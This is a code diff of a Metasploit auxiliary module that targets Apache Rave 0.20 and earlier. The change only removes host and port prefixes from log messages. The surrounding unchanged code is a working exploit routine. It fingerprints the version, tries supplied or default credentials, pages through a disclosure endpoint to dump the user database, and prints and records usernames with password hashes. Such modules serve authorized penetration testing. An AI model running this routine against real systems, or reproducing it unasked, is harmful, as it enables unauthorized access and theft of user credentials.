@@ -137,67 +137,67 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Fingerprinting...")
+    print_status("Fingerprinting...")
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.to_s, "login"),
       'method' => 'GET',
     })
 
     if not res
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - No response, aborting...")
+      print_error("No response, aborting...")
       return
     elsif res.code == 200 and res.body =~ /<span>Apache Rave ([0-9\.]*)<\/span>/
       version = $1
       if version <= "0.20"
-        print_good("#{Rex::Socket.to_authority(rhost, rport)} - Apache Rave #{version} found. Vulnerable. Proceeding...")
+        print_good("Apache Rave #{version} found. Vulnerable. Proceeding...")
       else
-        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Apache Rave #{version} found. Not vulnerable. Aborting...")
+        print_error("Apache Rave #{version} found. Not vulnerable. Aborting...")
         return
       end
     else
-      print_warning("#{Rex::Socket.to_authority(rhost, rport)} - Apache Rave Portal not found, trying to log-in anyway...")
+      print_warning("Apache Rave Portal not found, trying to log-in anyway...")
     end
 
     cookie = nil
     unless datastore["USERNAME"].empty? or datastore["PASSWORD"].empty?
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Login with the provided credentials...")
+      print_status("Login with the provided credentials...")
       cookie = login(datastore["USERNAME"], datastore["PASSWORD"])
       if cookie.nil?
-        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Login failed")
+        print_error("Login failed")
       else
-        print_good("#{Rex::Socket.to_authority(rhost, rport)} - Login Successful. Proceeding...")
+        print_good("Login Successful. Proceeding...")
       end
     end
 
     if cookie.nil?
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Login with default accounts...")
+      print_status("Login with default accounts...")
       @default_accounts.each { |user, password|
-        print_status("#{Rex::Socket.to_authority(rhost, rport)} - Login with the #{user} default account...")
+        print_status("Login with the #{user} default account...")
         cookie = login(user, password)
         unless cookie.nil?
-          print_good("#{Rex::Socket.to_authority(rhost, rport)} - Login Successful. Proceeding...")
+          print_good("Login Successful. Proceeding...")
           break
         end
       }
     end
 
     if cookie.nil?
-      print_error("#{Rex::Socket.to_authority(rhost, rport)} - Login failed. Aborting...")
+      print_error("Login failed. Aborting...")
       return
     end
 
-    print_status("#{Rex::Socket.to_authority(rhost, rport)} - Disclosing information...")
+    print_status("Disclosing information...")
     offset = 0
     search = true
 
     while search
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Disclosing offset #{offset}...")
+      print_status("Disclosing offset #{offset}...")
       users_data = disclose(cookie, offset)
       if users_data.nil?
-        print_error("#{Rex::Socket.to_authority(rhost, rport)} - Disclosure failed. Aborting...")
+        print_error("Disclosure failed. Aborting...")
         return
       else
-        print_good("#{Rex::Socket.to_authority(rhost, rport)} - Disclosure successful")
+        print_good("Disclosure successful")
       end
 
       json_info = JSON.parse(users_data)
@@ -210,11 +210,11 @@ class MetasploitModule < Msf::Auxiliary
         nil,
         "Apache Rave Users Database Offset #{offset}"
       )
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Information for offset #{offset} saved in: #{path}")
+      print_status("Information for offset #{offset} saved in: #{path}")
 
-      print_status("#{Rex::Socket.to_authority(rhost, rport)} - Recovering Hashes...")
+      print_status("Recovering Hashes...")
       json_info["result"]["resultSet"].each { |result|
-        print_good("#{Rex::Socket.to_authority(rhost, rport)} - Found cred: #{result["username"]}:#{result["password"]}")
+        print_good("Found cred: #{result["username"]}:#{result["password"]}")
         report_cred(
           ip: rhost,
           port: rport,
